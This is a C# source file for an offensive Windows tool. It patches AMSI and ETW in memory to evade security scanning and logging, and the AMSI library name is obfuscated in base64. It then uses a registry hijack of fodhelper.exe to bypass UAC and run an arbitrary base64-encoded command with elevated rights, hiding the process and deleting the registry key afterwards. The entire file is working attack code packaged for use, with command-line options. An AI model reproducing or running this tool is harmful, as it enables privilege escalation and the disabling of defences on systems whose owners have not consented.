using System;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using NDesk.Options;
using System.Runtime.InteropServices;

namespace fodhelper_bypass
{
    public class Amsi
    {
        static byte[] x64_etww_patch = new byte[] { 0x48, 0x33, 0xc0, 0xC3 };
        static byte[] x86_etww_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x13, 0x00 };
        public static Int64 x64_etww_offset = 0x1ed60;
        public static Int64 x86_etww_offset = 0x590;
        public static Int64 x64_ABS_offset = 0xcb0;
        public static Int64 x86_ABS_offset = 0x970;
        static byte[] x64 = new byte[] { 0x88, 0x57, 0x00, 0x07, 0x80, 0xc3 };
        static byte[] x86 = new byte[] { 0x88, 0x57, 0x00, 0x07, 0x80, 0xc2, 0x18, 0x00 };

        private static string decode(string b64enc)
        {
            return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64enc));
        }

        public static void Bypass()
        {
            if (is64Bit())
            {
                PatchAmsi(x64, x64_ABS_offset);
                PatchEtww(x64_etww_patch, x64_etww_offset);
            }
            else
            {
                PatchAmsi(x86, x86_ABS_offset);
                PatchEtww(x86_etww_patch, x86_etww_offset);
            }
        }

        private static void PatchMem(byte[] patch, string library, string function, Int64 offset = 0)
        {
            try
            {
                uint newProtect;
                uint oldProtect;
                IntPtr libPtr = Win32.LoadLibrary(library);
                IntPtr funcPtr = Win32.GetProcAddress(libPtr, function);
                if (offset != 0)
                {
                    funcPtr = new IntPtr(funcPtr.ToInt64() + offset);
                }
                Win32.VirtualProtect(funcPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, funcPtr, patch.Length);
                Win32.VirtualProtect(funcPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] {0}", e.Message);
                Console.WriteLine("[!] {0}", e.InnerException);
            }
        }

        private static void PatchAmsi(byte[] patch, Int64 offset)
        {
            string dll = decode("YW1zaS5kbGw=");
            PatchMem(patch, dll, "DllGetClassObject", offset);
        }

        private static void PatchEtww(byte[] Patch, Int64 offset)
        {
            PatchMem(Patch, "ntd" + "ll." + "dll", "RtlInitializeResource", offset);
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    public class AlwaysNotify
    {
        public AlwaysNotify()
        {
            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
            alwaysNotify.Close();

            if (consentPrompt == "2" & secureDesktopPrompt == "1")
            {
                System.Console.WriteLine("UAC is set to 'Always Notify.' This attack will fail. Exiting...");
                System.Environment.Exit(1);
            }
        }
    }
    public class FodHelper
    {
        public FodHelper(byte[] encodedCommand)
        {
            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

            //Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
            return;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            //Setting the command line parameters
            byte[] encodedCommand = null;
            bool help = false;

            var options = new OptionSet()
            {
                {"e|encodedCommand=", "Base64 encoded command to execute", v => encodedCommand = Convert.FromBase64String(v) },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);

                if (help == true)
                {
                    options.WriteOptionDescriptions(Console.Out);
                    System.Environment.Exit(1);
                }
                else if (encodedCommand == null)
                {
                    Console.Write("Missing encoded command to execute\n\n");
                    options.WriteOptionDescriptions(Console.Out);
                    System.Environment.Exit(1);
                }
                else if (encodedCommand != null && help == false)
                {
                    Amsi.Bypass();
                    FodHelper fodhelper = new FodHelper(encodedCommand);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }

        }
    }
}
